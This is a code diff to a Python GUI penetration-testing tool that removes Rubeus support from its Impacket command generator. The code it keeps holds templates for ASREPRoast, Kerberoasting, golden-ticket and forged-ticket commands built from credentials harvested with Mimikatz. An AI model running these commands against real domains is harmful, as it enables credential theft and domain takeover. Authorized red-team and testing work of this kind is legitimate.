@@ -73,7 +73,7 @@ class GonkWareApp:
         
         # Add tool tabs in order
         self.add_new_tool_tab("Mimikatz Parser", self.create_mimikatz_parser_tab)
-        self.add_new_tool_tab("Impacket/Rubeus", self.create_impacket_rubeus_tab)
+        self.add_new_tool_tab("Impacket", self.create_impacket_tab)
         self.add_new_tool_tab("Hash Tools", self.create_hash_tools_tab)
         self.add_new_tool_tab("Encoder/Decoder", self.create_encoder_tab)
 
@@ -1498,8 +1498,8 @@ Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
         except Exception as e:
             self.show_status_message(f"Export failed: {str(e)}", "#ff5555")
 
-    def create_impacket_rubeus_tab(self, parent_frame):
-        """Impacket/Rubeus command generator using credentials from Mimikatz parser"""
+    def create_impacket_tab(self, parent_frame):
+        """Impacket command generator using credentials from Mimikatz parser"""
         
         # Main container with dark styling
         main_frame = tb.Frame(parent_frame, bootstyle="dark")
@@ -1507,7 +1507,7 @@ Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
         main_frame.pack(fill=tb.BOTH, expand=True, padx=10, pady=10)
         
         # Title
-        title_label = tb.Label(main_frame, text="IMPACKET / RUBEUS COMMAND GENERATOR", 
+        title_label = tb.Label(main_frame, text="IMPACKET COMMAND GENERATOR", 
                               font=("Consolas", 16, "bold"),
                               style="StatusLabel.TLabel")
         title_label.pack(pady=(0, 20))
@@ -1620,8 +1620,7 @@ Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
             # "GetNPUsers.py - ASREPRoast attack",
             # "GetUserSPNs.py - Kerberoast attack",
             # "goldenPac.py - Golden ticket attack",
-            # "ticketer.py - Silver/Golden ticket creation",
-            # "rubeus.exe - Kerberos attacks"
+            # "ticketer.py - Silver/Golden ticket creation"
         ]
         
         # Create custom style for the tool dropdown
@@ -1738,7 +1737,7 @@ Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
         command_scrollbar.config(command=self.command_output.yview)
         
         # Initial text
-        self.command_output.insert("1.0", "Generated Impacket/Rubeus commands will appear here...\n\n1. Import credentials from Mimikatz Parser\n2. Configure target IP/domain\n3. Select tool and technique\n4. Choose credentials\n5. Generate commands")
+        self.command_output.insert("1.0", "Generated Impacket commands will appear here...\n\n1. Import credentials from Mimikatz Parser\n2. Configure target IP/domain\n3. Select tool and technique\n4. Choose credentials\n5. Generate commands")
         
         # Copy button
         copy_commands_button = tb.Button(command_frame, text="Copy Commands", 
@@ -1824,8 +1823,7 @@ Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
             "GetNPUsers.py - ASREPRoast attack": "Target users with 'Do not require Kerberos preauthentication'.",
             "GetUserSPNs.py - Kerberoast attack": "Request TGS for accounts with SPNs.",
             "goldenPac.py - Golden ticket attack": "Requires krbtgt hash for golden ticket creation.",
-            "ticketer.py - Silver/Golden ticket creation": "Create Kerberos tickets with NTLM hashes.",
-            "rubeus.exe - Kerberos attacks": "Comprehensive Kerberos attack toolkit."
+            "ticketer.py - Silver/Golden ticket creation": "Create Kerberos tickets with NTLM hashes."
         }
         
         # Update command output with guidance
@@ -1844,7 +1842,7 @@ Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
         self.password_creds_listbox.selection_clear(0, tk.END)
 
     def generate_impacket_commands(self):
-        """Generate Impacket/Rubeus commands based on selections"""
+        """Generate Impacket commands based on selections"""
         tool = self.selected_tool.get().split(" - ")[0]  # Extract tool name
         target_ip = self.target_ip_entry.get().strip()
         domain = self.domain_entry.get().strip()
@@ -1926,8 +1924,7 @@ Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
             "GetNPUsers.py": f"python3 GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt",
             "GetUserSPNs.py": f"python3 GetUserSPNs.py {auth_part} -dc-ip {target_ip} -request",
             "goldenPac.py": f"python3 goldenPac.py {domain}/{username}@{target_ip}",
-            "ticketer.py": f"python3 ticketer.py -nthash {hash_val} -domain-sid S-1-5-21-XXX-XXX-XXX -domain {domain} Administrator" if hash_val else None,
-            "rubeus.exe": f"rubeus.exe kerberoast /domain:{domain} /dc:{target_ip}"
+            "ticketer.py": f"python3 ticketer.py -nthash {hash_val} -domain-sid S-1-5-21-XXX-XXX-XXX -domain {domain} Administrator" if hash_val else None
         }
         
         return commands.get(tool, f"# Unsupported tool: {tool}")
